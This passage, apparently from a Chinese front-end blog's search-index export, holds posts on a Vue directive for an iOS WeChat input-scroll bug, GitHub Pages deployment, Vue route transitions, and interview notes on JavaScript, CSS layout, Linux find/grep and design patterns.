    <url>%2Fblog%2Fvue%2Fvue%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E8%A7%A3%E5%86%B3iOS%E5%BE%AE%E4%BF%A1%E7%AB%AFinput%E5%A4%B1%E7%84%A6%E5%9B%9E%E5%BC%B9%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[iOS微信端H5在input失去焦点的时候存在无法回弹的bug，微信也一直没有修复这个问题。 解决办法如下： focus的时候记录当前的scrollTop值 blur的时候使用scrollTo回弹记录的scrollTop值 下面讲解如何通过vue的自定义指令来自动解决该bug12345678910111213141516171819202122232425262728293031323334353637383940414243export default &#123; springBack: &#123; bind (el, binding) &#123; const ua = window.navigator.userAgent if (!(/iphone|ipad/gi.test(ua) &amp;&amp; /MicroMessenger/gi.test(ua))) return function focusEvent () &#123; el.__keyboardState__ = 1 el.__scrollTop__ = document.documentElement.scrollTop || document.body.scrollTop &#125; function blurEvent () &#123; el.__keyboardState__ = 0 /** * 假如我们在input框的后面增加clear icon，不做处理时点击clear icon，键盘会失焦收起，这种体验肯定是不好的 * 通常情况我们会在点击clear icon的时候，增加input.focus()，执行流程是click-&gt;blur-&gt;focus * 该指令中如果在blur时直接执行回弹，就会出现问题，故增加__keyboardState__记录当前状态，再延迟判断执行回弹操作 */ setTimeout(() =&gt; &#123; if (!el.__keyboardState__) window.scrollTo(0, el.__scrollTop__) &#125;, 10) &#125; el.__vueInputFocus__ = focusEvent el.__vueInputBlur__ = blurEvent el.addEventListener('focus', focusEvent) el.addEventListener('blur', blurEvent) &#125;, // 元素销毁的时候的会触发解绑 unbind (el, binding) &#123; const ua = window.navigator.userAgent if (!(/iphone|ipad/i.test(ua) &amp;&amp; /(micromessenger)\//.test(ua))) return el.removeEventListener('focus', el.__vueInputFocus__) el.removeEventListener('blur', el.__vueInputBlur__) delete el.__vueInputFocus__ delete el.__vueInputBlur__ delete el.__scrollTop__ &#125; &#125;&#125;import springBack from '.@/directives/springBack'directives: springBack]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用github pages发布自己的网站]]></title>
    <url>%2Fblog%2Ftools%2F%E4%BD%BF%E7%94%A8github_pages%E5%8F%91%E5%B8%83%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99.html</url>
    <content type="text"><![CDATA[当我们使用Github、Coding Net、码云Gitee等存储工程代码时，都会有相应的pages服务。 它们提供的pages如下： Github Pages: ****.github.io CodingNet Pages: ****.coding.me Gitee Pages: ****.gitee.io 以Github Pages为例，操作流程如下： 为了使多个项目可以共用该Github Pages，我们不建议将某个项目直接设置使用。 在github中新建一个以自己 用户名.github.io 开头的工程名称，并设置为public，如 cpm828.github.io。 在 cpm828.github.io 工程下新建一个index.html，用于存放一个路由导航页面，可以导航到其他工程。操作完成之后就可以使用 https://cpm828.github.io 来访问这个index.html了。 继续绑定自己购买的域名。 在Settings页面 Github Pages 模块里面设置 Custom domain 为自己的域名，如 pimichen.com，如图： 在 cpm828.github.io 新建一个 CNAME 文件，里面写上自己的域名。如图： 如果操作正确，会出现该提示，如图。现在，你可以使用自己的域名访问了。 继续设置https协议。 在Settings页面 Github Pages 模块，勾选 Enforce HTTPS，如果出现置灰无法勾选的情况，打开网页控制台，找到该input，手动删除 disabled 属性，然后勾选即可成功。哈哈，Github 你不要太调皮。 成功之后即可以使用https来访问了。 附加： Github 里面的工程可以设置一个 gh-pages 分支用于存放需要使用 Github Pages 的代码内容。如新建了一个 cpm-ui 的工程，我们将编译后的目录存放到 gh-pages 分支中，vue-cli 生成 gh-pages 分支步骤如下： 正常创建工程并存放到github上 npm安装gh-pages 1npm install gh-pages -D 配置快速启动脚本，配置homepages package.json: 1234"homepage": "https://cpm828.github.io/cpm-ui", // 首页地址"script": &#123; "deploy": "gh-pages -d examples/dist"&#125; 如果是vue-cli项目，需要修改config/index.js: 123build: &#123; assetsPublicPath: ''&#125; 执行编译，即可成功创建 gh-pages 1npm run deploy 操作成功后访问 https://pimichen.com/cpm-ui 即可以直接指向 cpm-ui 工程下 gh-pages 分支中的内容。]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue利用transition实现路由切换仿APP效果]]></title>
    <url>%2Fblog%2Fvue%2Fvue%E5%88%A9%E7%94%A8transition%E5%AE%9E%E7%8E%B0%E8%B7%AF%E7%94%B1%E5%88%87%E6%8D%A2%E4%BB%BFAPP%E6%95%88%E6%9E%9C.html</url>
    <content type="text"><![CDATA[在使用iOS APP时，我们经常能看见原生的切换效果体验非常顺滑。切换下一页时，动画从右往左。返回上一页时，动画从左往右。 使用vue的transition过渡动画也可以实现这一效果，效果图如下： router/index.js源码如下：123456789101112131415161718192021222324252627import Vue from 'vue'import Router from 'vue-router'// 参考：https://blog.csdn.net/bbsyi/article/details/78195378// 给Router扩展一个goBack方法，需要后退是调用this.$router.goBack()Router.prototype.goBack = function () &#123; this.goNext = 0 // 扩展一个变量记录后退 this.go(-1) // 后退&#125;Vue.use(Router)export default new Router(&#123; routes: [ ...firstEntries, // 略 ...homeEntries, ...discoverEntries, ...orderEntries, ...userEntries, &#123; path: '*', redirect: &#123; name: 'Home' &#125; &#125; ]&#125;) APP.vue源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;template&gt; &lt;div id="app"&gt; &lt;rFlexFixed&gt; &lt;rTitlebar slot="header" theme="a" :title="currentRouteInfo.meta.title" @onback="goBack" v-if="showBar"&gt;&lt;/rTitlebar&gt; &lt;div class="main-content"&gt; &lt;transition :name="transitionName" :mode="modeName"&gt; &lt;router-view class="page-wrap"/&gt; &lt;/transition&gt; &lt;/div&gt; &lt;pFooter slot="footer" :currentRouteName="currentRouteInfo.name" v-if="!showBar"&gt;&lt;/pFooter&gt; &lt;/rFlexFixed&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import pFooter from '@/components/pFooter'export default &#123; name: 'App', components: &#123; pFooter &#125;, data () &#123; return &#123; showBar: false, // 是否显示titleBar currentRouteInfo: &#123;&#125;, // 当前页的信息 transitionName: '', modeName: '' &#125; &#125;, watch: &#123; '$route' (to, from) &#123; this.showBar = !['Home', 'Discover', 'Order', 'User'].includes(to.name) this.currentRouteInfo = to // 控制过渡动效 if (from.fullPath === '/' || to.params.tab) &#123; // 首次载入和tab间切换 this.transitionName = 'router-fade' this.modeName = 'out-in' // 控制一个页面先离开，另一个页面再进入 &#125; else if (!this.$router.goNext) &#123; // 后退 this.transitionName = 'router-out' this.modeName = '' &#125; else &#123; // 前进 this.transitionName = 'router-in' this.modeName = '' &#125; this.$router.goNext = 1 // 默认为前进 &#125; &#125;, methods: &#123; goBack () &#123; this.$router.goBack() &#125; &#125;&#125;&lt;/script&gt;&lt;style lang="scss"&gt;#app &#123; font-family: 'Avenir', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; width: 100%; height: 100%; .main-content&#123; width: 100%; height: 100%; position: relative; &#125; .page-wrap&#123; position: absolute; left: 0; top: 0; width: 100%; height: 100%; overflow-y: scroll; &amp;::-webkit-scrollbar&#123;display: none;&#125; &#125;&#125;// 主导航切换// 淡入淡出动画.router-fade-enter-active, .router-fade-leave-active &#123; transition: opacity .3s ease-out;&#125;.router-fade-enter, .router-fade-leave-active &#123; opacity: 0;&#125;// 二级页面左右切换// router-out表示返回上一页（右到左），router-in表示前进下一页（左到右）.router-in-enter-active,.router-in-leave-active,.router-out-enter-active,.router-out-leave-active&#123; transition: all 0.3s ease-out;&#125;.router-in-leave-active,.router-out-enter&#123; opacity: 0; transform: translate3d(-100%, 0, 0);&#125;.router-in-enter,.router-out-leave-active&#123; opacity: 0; transform: translate3d(100%, 0, 0);&#125;&lt;/style&gt; 主导航切换使用fade效果，二级页面间切换使用左右切换效果。 本例中，我们将titleBar放置在了APP.vue，对于实际的项目，可能需要将titleBar放置的页面中，便于更好的控制titleBar]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端常见的面试题]]></title>
    <url>%2Fblog%2Fother%2F%E5%89%8D%E7%AB%AF%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[常见的前端算法题 见：前端算法集合 Event Loop 参考：掘金 彻底弄懂 JavaScript 执行机制 任务分为：同步任务、异步任务异步任务分为：宏任务、微任务 算法的时间与空间复杂度 参考：知乎 算法的时间与空间复杂度 常用的时间复杂度（从上只下越来越复杂）： 常数阶 O(1) 对数阶 O(logN) 线性阶 O(n) 线性对数阶 O(n * logN) 平方阶 O(n^2) 立方阶 O(n^3) k次方阶 O(n^k) 指数阶 O(2^n) 常用的空间复杂度： 常数阶 O(1) 线性阶 O(n) 平方阶 o(n^2) SetTimeout的时间什么不准js是单线程，先执行同步主线程，再执行异步任务队列。主线程的耗时会影响setTimeout的执行时间。它表述的是一个最小延迟时间，而非精准时间。123setTimeout(() =&gt; &#123; // xxx&#125;, 0) 根据HTML5的规范，定时器被多次嵌套后，最小为4毫秒。 另外，setTimeout 本身也可以通过递归实现 setInterval 的功能，setTimeout 和 setInterval 都有可能出现丢帧现象，原因时步调和 requestAnimationFrame 的步调不一致，requestAnimationFrame 是按照屏幕刷新率来进行更新的，一旦两者时间错开，则肯能出现丢帧现象。 函数防抖和函数节流 参考：csdn 前端性能——JS的防抖和节流其他：segmentfault 7分钟理解JS的节流、防抖及使用场景 函数节流和函数防抖，两者都是优化高频率执行js代码的一种手段。 函数防抖 debounce函数防抖 是指当持续触发事件时，一定时间段内没有再触发事件，事件处理函数才会执行一次，如果设定的时间到来之前，又一次触发了事件，就重新开始延时。比如生活中的坐公交，就是一定时间内，如果有人陆续刷卡上车，司机就不会开车。只有别人没刷卡了，司机才开车。 如下例，持续触发scroll事件时，并不执行handle函数，当1000毫秒内没有触发scroll事件时，才会延时触发scroll事件。 1234567891011121314151617181920212223242526function debounce(fn, delay) &#123; var timeout = null; // 此处只执行一次 return function() &#123; // var context = this // var args = arguments // 此处会一直被执行 clearTimeout(timeout); // fn.apply(context, args) // 将上下文和参数传给handle timeout = setTimeout(fn, delay); &#125;&#125;// 处理函数function handle() &#123; console.log(Math.random());&#125;// 滚动事件window.addEventListener('scroll', debounce(handle, 1000));// 注意：// window.addEventListener('scroll', debounce);// window.addEventListener('scroll', function () &#123;debounce(handle, 1000) &#125;);// 这两种均会导致debounce一直被执行// 另外addEventListener第二个参数还支持传入object：// window.addEventListener('scroll', &#123; handleEvent: function () &#123;&#125; &#125;); 运行结果如下： 函数节流 throttle函数节流 是指当持续触发事件时，保证一定时间段内只调用一次事件处理函数。通俗解释就比如我们水龙头放水，阀门一打开，水哗哗的往下流，秉着勤俭节约的优良传统美德，我们要把水龙头关小点，最好是如我们心意按照一定规律在某个时间间隔内一滴一滴的往下滴。 如下例，持续触发scroll事件时，并不立即执行handle函数，每隔1000毫秒才会执行一次handle函数。 定时器方案 123456789101112131415161718var throttle = function(fn, wait) &#123; var timer = null; return function() &#123; // var context = this; // var args = arguments; if (!timer) &#123; timer = setTimeout(function() &#123; fn(); // fn.apply(context, args); timer = null; &#125;, wait); &#125; &#125;&#125;function handle() &#123; console.log(Math.random());&#125;window.addEventListener('scroll', throttle(handle, 1000)); 时间戳方案 1234567891011121314151617var throttle = function(fn, wait) &#123; var prev = Date.now(); return function() &#123; // var context = this; // var args = arguments; var now = Date.now(); if (now - prev &gt;= wait) &#123; fn(); // fn.apply(context, args); prev = Date.now(); &#125; &#125;&#125;function handle() &#123; console.log(Math.random());&#125;window.addEventListener('scroll', throttle(handle, 1000)); 运行结果如下： IE盒模型和标准盒模型IE盒模型IE 盒模型包括 margin、border、padding、content，width 包含了 content、border 和 pading，即使用 border、padding 不会撑大 width。 标准(W3C)盒模型W3C 盒子模型包括 margin、border、padding、content，width 不包含 border 和 pading，即使用 border、padding 会撑大 width。 例如，一个元素的样式如下：1234567div&#123; margin: 20px; border: 10px; padding: 5px; width: 200px; height: 50px;&#125; 则 W3C 盒模型下：盒模型占用的宽度为：20*2 + 10*2 + 5*2 + 200 = 270px;盒子实际宽度为：10*2 + 5*2 + 200 = 230px; IE 盒模型下：盒模型占用的宽度为：20*2 + 200 = 240px;盒子实际宽度为：200px; 实际开发过程中，我们经常会使用 box-sizing 来改变盒模型，常见的有：123456div&#123; box-sizing: content-box; /* 默认W3C盒模型，width只极算content */ /* 实际开发过程中会经常使用下面这种 */ box-sizing: border-box; /* 使用IE盒模型，width计算到border，这种模式下先固定宽度，然后padding和border不会对元素产生影响 */&#125; css 实现响应式的九宫格布局1234567891011&lt;div class="main"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt; &lt;div&gt;6&lt;/div&gt; &lt;div&gt;7&lt;/div&gt; &lt;div&gt;8&lt;/div&gt; &lt;div&gt;9&lt;/div&gt;&lt;/div&gt; 使用百分比实现：123456789101112131415161718192021222324252627* &#123; padding: 0; margin: 0; box-sizing: border-box; /* 重要 */&#125;.main &#123; background-color: #fff; outline: 1px solid #00; width: 100%; overflow: hidden; padding: 0 100px; /* 左右各间距100px */&#125;.main&gt;div &#123; width: 33.33%; /* padding设置百分比时，是根据父级的宽度来计算的 */ padding: 16.67% 0; background-color: #E78326; border-radius: 3%; float: left; /* 浮动自动换行，也可以给main设置flex替代 */ border: 1px solid #000; /* 内部div增加居中的文字 */ height: 0; display: flex; justify-content: center; align-items: center;&#125; 使用 vw + calc 实现（兼容性不佳）：12345678910111213141516171819*&#123; margin: 0; padding: 0; box-sizing: border-box;&#125;.main&#123; width: 100%; padding: 0 150px; overflow: hidden;&#125;.main&gt;div&#123; width: calc((100vw - 300px) / 3); height: calc((100vw - 300px) / 3); border: 1px solid #f00; float: left; display: flex; justify-content: center; align-items: center;&#125; BFCBFC概念BFC（Block formatting context）直译为“块级格式化上下文”，只有块级的盒子参与，内部规定了块级盒子如何布局。 BFC是一个独立的布局环境，其中的元素布局是不受外界的影响。 display属性为block、table、list-item的元素默认会产生BFC。也可以手动创建，如果将一个div（默认为块级元素，即本身拥有BFC）设置为inline-block，会产生一个新的BFC。 如何创建BFC float属性不为none position属性为absolute或fixed display为inline-block、flex、inline-flex、table-cell overflow不为visible BFC布局特性 在BFC中，盒子从顶端开始垂直往下排列 盒子垂直方向的间距由margin决定，属于同一个BFC的两个相邻的盒子margin会发生重叠 在BFC中，每一个盒子的左外边缘（margin-left）会触碰到容器的左内边缘（padding-left） BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘 在计算BFC的高度时，也会检测浮动或定位的盒子高度 BFC的作用 清除浮动只要把父元素设置为BFC，就可以清除子元素的浮动了，如：常使用 overflow:hidden 123&lt;div&gt; &lt;p&gt;1&lt;/p&gt;&lt;/div&gt; 123456div&#123;&#125;p &#123; width: 200px; line-height: 100px; text-align: center;&#125; 我们可以给div设置以下这些样式 12345678910111213141516div&#123; /*推荐第一种*/ overflow: hidden; overflow: auto; display: flex; /* 可以解决p的浮动问题，但同时增加了div自己的浮动问题 */ float: left; /* 可以解决p的浮动问题，但是同时让div没有宽度，只是被p给撑起来了 */ display: inline-block; display: table-cell; display: inline-flex; position: absolute; position: fixed;&#125; 解决外边距合并问题只要创建不属于同一个BFC，外边距就不会发生合并，如： 12&lt;p&gt;1&lt;/p&gt;&lt;p class="p2"&gt;2&lt;/p&gt; 1234567p &#123; width: 200px; line-height: 100px; text-align: center; background-color: #f00; margin: 30px;&#125; 有两个p（块级元素，本身拥有同一个BFC），都设置 marign 时，默认p1的 marign-bottom 和p2的 margin-top 会发生合并，只表现出一个30px的间距。如何解决呢？可以让p2产生一个新的BFC，只要不p1、p2不属于同一个BFC，margin 就不会发生合并。 1234567.p2&#123; float: left; display: inline-block; display: inline-flex; position: absolute; position: fixed;&#125; 以上这些属性都可以直接作用于某个盒子本身，然后产生一个新的BFC。当然也可以有更多的办法： 1234&lt;p&gt;1&lt;/p&gt;&lt;div&gt; &lt;p&gt;2&lt;/p&gt;&lt;/div&gt; 使用div包裹p2，然后给div这个父级设置样式，这个时候就有了更多的选择，任选一种即可。 123456789101112div&#123; float: left; display: inline-block; display: inline-flex; position: absolute; position: fixed; /* 除了上面这些，还可添加这些作用于父级的样式 */ overflow: hidden; overflow: auto; display: flex; display: table-cell;&#125; 自适应两列布局根据特性3: 每一个盒子的左外边缘（marigin）会触碰容器的左内边缘（border-left），即使是浮动元素。 12&lt;div class="left"&gt;LEFT&lt;/div&gt;&lt;div class="right"&gt;RIGHT&lt;/div&gt; 1234567891011121314151617181920body&#123; border: 5px solid #f00;&#125;.left &#123; width: 100px; height: 150px; float: left; background: #0f0; text-align: center; line-height: 150px; font-size: 20px; margin: 5px;&#125;.right &#123; height: 300px; background: #00f; text-align: center; line-height: 300px; font-size: 40px;&#125; 从下图可以看出：left的margin-left外边缘（蓝色margin 5px左侧）和父级容器（body）的padding-left（红色border 5px内侧）内边相触碰。 再根据特性4：BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘。让right单独成一个BFC，添加样式： 123.right&#123; overflow: hidden;&#125; 这样就实现两列布局了，并且right布局可以自适应 flex布局 flex-grow: 定义项目的放大比例 定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 如果所有项目的 flex-grow 属性都为1，则它们将等分剩余空间（如果有的话）。 如果一个项目的 flex-grow 属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 如果只有一个项目设置 flex-grow 大于0，即该项目占满剩余空间。通常使用该特性来实行两列或三列自适应布局。 12345&lt;div class="parent"&gt; &lt;div class="child1"&gt;1&lt;/div&gt; &lt;div class="child2"&gt;2&lt;/div&gt; &lt;div class="child3"&gt;3&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021.parent &#123; width: 100%; height: 200px; display: flex;&#125;.child1 &#123; width: 80px; /* 左侧固定了80 */ height: 100px; background-color: red;&#125;.child2 &#123; /*width: 140px;*/ /* 无需设置宽度 */ height: 150px; background-color: green; flex-grow: 1; /* 中间设置flex-grow大于1即可占满中间区域 */&#125;.child3 &#123; width: 100px; /* 右侧固定了100 */ height: 120px; background-color: blue;&#125; flex-shrink: 定义了项目的缩小比例 定义项目的缩小比例，默认为1，即如果空间不足，该项目将等比缩小（作用类似于所有的项目设置flex-grow: 1）。 如果所有项目的 flex-shrink 属性都为1，当空间不足时，都将等比例缩小。 如果所有项目的 flex-shrink 属性都为0，当空间不足时，不缩小，自动超出。 如果一个项目的 flex-shrink 属性为0，其他项目都为1，当空间不足时，前者（flex-shrink: 0）不缩小。 12345&lt;div class="parent"&gt; &lt;div class="child1"&gt;1&lt;/div&gt; &lt;div class="child2"&gt;2&lt;/div&gt; &lt;div class="child3"&gt;3&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223.parent &#123; width: 100%; height: 200px; display: flex;&#125;.child1 &#123; width: 80px; /* 左侧固定了80 */ height: 100px; background-color: red; flex-shrink: 0; /* 不进行缩放，相当于固定宽度 */&#125;.child2 &#123; width: 100%; /* 中间宽度设置100% */ height: 150px; background-color: green; flex-shrink: 1; /* 默认为1，进行等比缩放 */&#125;.child3 &#123; width: 100px; /* 右侧固定了100 */ height: 120px; background-color: blue; flex-shrink: 0; /* 不进行缩放，相当于固定宽度 */&#125; flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间 表示在item被放入flex容器之前的大小，也就是item的理想或者假设大小，但是并不是其真实大小，其真实大小取决于flex容器的宽度。 类似width flex: flex-grow, flex-shrink 和 flex-basis的简写 案例 1234567891011121314151617181920&lt;div&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt;外层div=1000px，display: flex考察缩小：div1（flex: 3 3 400px）=&gt; width = 400 - (3 / 5 * (400 + 400 - 600)) = 280pxdiv2（flex: 2 2 400px）=&gt; width = 400 - (2 / 5 * (400 + 400 - 600)) = 320pxdiv3（flex: 0 0 400px）=&gt; width = 400px如果div=1500px呢？考察放大：div1（flex: 3 3 400px）=&gt; width = 400 + (3 / 5 * (1500 - 400 - 800)) = 580pxdiv2（flex: 2 2 400px）=&gt; width = 400 + (2 / 5 * (1500 - 400 - 800)) = 520pxdiv3（flex: 0 0 400px）=&gt; width = 400px先根据 flex-basis 值确定是超出（需缩小）还是不足（需放大），然后计算得到剩余的空间（总空间-固定空间），然后再计算占据的比例，最后再用原值进行加减 linux 查找文件的命令find基本格式：find path expression 按照文件名查找 find / -name httpd.conf #在根目录下查找文件httpd.conf，表示在整个硬盘查找 find /etc -name httpd.conf #在/etc目录下文件httpd.conf find /etc -name &#39;*srm*&#39; #使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件 find . -name &#39;srm*&#39; #表示当前目录下查找文件名开头是字符串‘srm’的文件 按照文件特征查找 find / -amin -10 # 查找在系统中最后10分钟访问的文件(access time) find / -atime -2 # 查找在系统中最后48小时访问的文件 find / -empty # 查找在系统中为空的文件或者文件夹 find / -group cat # 查找在系统中属于 group为cat的文件 find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件(modify time) find / -mtime -1 #查找在系统中最后24小时里修改过的文件 find / -user fred #查找在系统中属于fred这个用户的文件 find / -size +10000c #查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB) find / -size -1000k #查找出小于1000KB的文件 使用混合查找方式查找文件 find /tmp -size +10000c -and -mtime +2 #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件 find / -user fred -or -user george #在/目录下查找用户是fred或者george的文件文件 find /tmp ! -user panda #在/tmp目录中查找所有不属于panda用户的文件 grep基本格式：find expression 主要参数[options]主要参数：－c：只输出匹配行的计数。－i：不区分大小写－h：查询多文件时不显示文件名。－l：查询多文件时只输出包含匹配字符的文件名。－n：显示匹配行及行号。－s：不显示不存在或无匹配文本的错误信息。－v：显示不包含匹配文本的所有行。 pattern正则表达式主要参数：\： 忽略正则表达式中特殊字符的原有含义。^：匹配正则表达式的开始行。$: 匹配正则表达式的结束行。\&lt;：从匹配正则表达 式的行开始。>：到匹配正则表达式的行结束。[ ]：单个字符，如[A]即A符合要求 。[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。.：所有的单个字符。 ：有字符，长度可以为0。 实例 grep &#39;test&#39; d* #显示所有以d开头的文件中包含 test的行 grep ‘test’ aa bb cc #显示在aa，bb，cc文件中包含test的行 grep ‘[a-z]\{5\}’ aa #显示所有包含每行字符串至少有5个连续小写字符的字符串的行 grep magic /usr/src #显示/usr/src目录下的文件(不含子目录)包含magic的行 grep -r magic /usr/src #显示/usr/src目录下的文件(包含子目录)包含magic的行 grep -w pattern files #只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)， css伪类和伪元素的区别伪类伪类 用于选择DOM树上元素不同的状态，或者是DOM上无法用简单选择器选择的元素 状态伪类状态伪类 是基于元素当前状态进行选择的 12:link :hover :active :visited:focus :disabled :enable :checked 结构伪类结构性伪类 是css3新增选择器，利用dom树进行元素过滤，通过文档结构的互相关系来匹配元素，能够减少class和id属性的定义，使文档结构更简洁。 12:first-child :last-child :nth-child(n) :nth-last-child() :empty 伪元素伪元素 是对元素中的特定内容进行操作，而不是描述状态。(css3中使用::)1::first-letter ::first-line ::before ::after ::selection 注意事项在css3中，为了一个规范，我们使用 :表示伪类，:: 表示伪元素，但是在css2中定义的伪元素，用来 : 和 :: 都是可以的。如 :before 和 ::before 作用是一样的 伪元素的用途 清除浮动 123456/* 父级 */.clear:after &#123; content: ''; display: block; clear: both;&#125; 画中间带文字的分割线 1234567.spliter::before, .spliter::after &#123; content: ''; display: inline-block; border-top: 1px solid black; width: 200px; margin: 5px;&#125; 形变的布局（上下、左右不一样）原理同2 增大点击热区 12345678.btn::before &#123; content: ""; position: absolute; top: -10px; right: -10px; bottom: -10px; left: -10px;&#125; 伪元素的本质是在不增加dom结构的基础上添加的一个元素，在用法上跟真正的dom无本质区别。普通元素能实现的效果，伪元素都可以。有些用伪元素效果更好，代码更精简。 script defer 和 async无defer和async当没有 defer 和 async 的时候，js会按照顺序来渲染和执行，如：1234567&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;script src="a.js"&gt;&lt;/script&gt; &lt;p&gt;1234&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; a.js:1debugger 在 debugger 执行的时候，页面还未渲染 p 段落。 有deferdefer 属性标注的脚本是 延迟脚本，使得浏览器延迟脚本的执行，也就是说，脚本会被 异步下载 但是不会被执行，直到文档的载入和解析完成，并可以操作，脚本才会被执行。延迟脚本 会按他们在文档里的出现顺序执行 有asyncasync 属性标注的脚本是 异步脚本，即异步下载脚本时，不会阻塞文档解析，但是一旦下载完后，立即执行，阻塞文档解析。异步脚本 在它们载入后执行，但是不能保证执行顺序。 图例绿色线 代表 HTML 解析，蓝色线 代表网络读取 JS，红色线 代表 JS 执行时间。 静态（词法）作用域语言 和 动态作用域语言 静态作用域语言：指变量的作用域是在代码编译阶段确定的，又称之为词法作用域。JavaScript 是静态作用域。 动态作用域语言：指变量作用域是在代码执行阶段确定的。 理解 JavaScript 静态作用域的关键在于理解变量的作用域是由使用该变量的源代码位置确定，而不是由调用该变量时候的位置确定。如下：123456789var v = "out";function outside() &#123; var v = "in"; return inside();&#125;function inside() &#123; return v;&#125;outside(); 比较123456789var v = "out";function outside() &#123; var v = "in"; function inside() &#123; return v; &#125; return inside();&#125;outside(); 第一段代码的执行结果是”out”，而第二段代码的执行结果是”in”。 js事件模型一个事件的发生包含三个过程： 事件捕获阶段事件捕获：当某个元素触发事件，顶层对象document就会发出一个事件流，随着DOM树的节点向目标元素流去。直到到达目标元素，在这个过程中，事件相应的监听函数是不会被触发的。 事件目标阶段当到达目标元素后，执行目标元素相应的事件处理函数，如果没有绑定事件处理函数，则不触发。 事件冒泡阶段从目标元素开始，向顶层元素开始冒泡。途中如果有节点绑定了相应的处理函数，则会被触发。 所有的事件类型都会经历捕获，但只有部分事件会经历事件冒泡，如submit事件就不会被冒泡。 如何阻止冒泡：W3C: e.stopPropagation()IE: e.cancelBubble = true 标准的事件监听器如何绑定：12target.addEventListener(type, listener[, options]); target.addEventListener(type, listener[, useCapture]); 第三个参数可以设置为boolean类型（useCapture）或者object类型(options) useCapture：指定是否在捕获阶段进行处理，默认为false，表示在冒泡阶段处理，为true表示在捕获阶段处理。 options: 包含三个布尔值 1). capture，是否使用事件捕获，同useCapture 2). once，是否只调用一次，会在调用后自动销毁（无需手动removeListener），默认值false 3). passive，如果为true，表示listener永远不会调用preventDefault()方法 例：12345&lt;div class="div1"&gt; &lt;div class="div2"&gt; &lt;button class="btn"&gt;点击&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213var div1 = document.querySelector('.div1')var div2 = document.querySelector('.div2')var btn = document.querySelector('.btn')div1.addEventListener('click', function () &#123; console.log('div1')&#125;)div2.addEventListener('click', function () &#123; console.log('div2')&#125;)btn.addEventListener('click', function () &#123; console.log('btn')&#125;) 先后顺序是怎样的呢？ 在js中，分为两个处理方法，捕获和冒泡。如果是捕获（从外到内）：div1、div2、btn，第三个参数设置为true如果是冒泡（从内到外）：btn、div2、div1，第三个参数设置为false（默认） addEventListener 和 removeEventListener 是否一定要成双成对出现？当DOM元素与事件拥有不同的生命周期时，如果不调用remove，可能会造成内存泄漏（增加了不必要的内存占用）。比如在单页应用中，切换了页面，组件虽然被销毁，但是注册在document上的事件却被保留了下来，白白占用了内存空间。所以成对出现，是最佳实践。 js设计模式 转载：segmentfault JavaScript中常用的设计模式 创建型 工厂模式 单例模式 原型模式 结构型 适配器模式 代理模式 行为型 策略模式 迭代器/遍历器模式 观察者模式 订阅发布模式 命令模式 状态模式 创建型: 工厂模式12345678910111213141516// 工厂模式：创建对象时不会对客户端暴露创建逻辑，通过使用一个通用的接口来指向新创建的对象，用工厂方法代替new// 构造函数和创建者分离，对new操作进行了封装class Creator &#123; create (name) &#123; return new Animal(name) &#125;&#125;class Animal &#123; constructor (name) &#123; this.name = name &#125;&#125;var creator = new Creator() // 此时不暴露创建逻辑// 通过使用共同的create接口来指向新创建的对象var duck = creator.create('Duck')var chicken = creator.create('Chicken') 创建型: 单例模式12345678910111213141516171819202122232425262728293031323334// 单例模式：一个类只能被实例化一次，提供一个访问类的全局访问点// 实例如果已经创建，则直接返回// 使用构造函数来判断function Head (name) &#123; if (typeof Head.instance === 'object') &#123; return Head.instance &#125; // 创建实例this this.name = name Head.instance = this return Head.instance&#125;var a = new Head()var b = new Head()console.log(a === b)// 使用闭包来判断var Head = (function () &#123; // 内部申明一个HeadClass类，外部无法访问 function HeadClass () &#123;&#125; var instance = null return function () &#123; if (instance) &#123; return instance &#125; instance = new HeadClass() return instance &#125;&#125;)()var a = new Head('A')var b = new Head('B')console.log(a === b) // true 创建型: 原型模式1234567891011121314151617181920212223242526// 原型模式：使用现有的对象来提供新创建新的对象的__proto__，Object.create()var prototype = &#123; name: 'Jack', getName: function () &#123; return this.name &#125;&#125;var obj = Object.create(prototype, &#123; job: &#123; value: 'IT' &#125; &#125;)console.log(obj.name, obj.job) // Jack、ITconsole.log(obj.getName()) // Jackconsole.log(obj)/* &#123; job: 'IT', __proto__: &#123; name: 'JACK', getName: function () &#123; return this.name &#125; &#125;&#125;*/ 行为型: 